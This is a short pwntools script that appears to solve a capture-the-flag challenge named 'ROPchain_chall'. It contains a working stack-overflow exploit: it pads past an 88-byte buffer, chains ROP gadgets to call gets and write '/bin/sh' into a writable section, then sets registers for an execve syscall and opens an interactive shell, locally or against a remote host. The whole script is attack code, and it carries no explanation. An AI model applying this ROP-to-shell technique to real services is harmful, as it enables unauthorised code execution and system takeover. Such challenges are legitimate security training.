#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./ROPchain_chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e

rw_section = 0x406be0

payload = flat(b'a'*88, pop_rdi, rw_section, exe.sym['gets'])

payload += flat(pop_rdi, rw_section)
payload += flat(pop_rsi, 0)
payload += flat(pop_rdx, 0)
payload += b'b'*0x28
payload += flat(pop_rax, 0x3b, syscall)

p.sendlineafter(b'something: ', payload)
p.sendline(b'/bin/sh\0')
p.interactive()	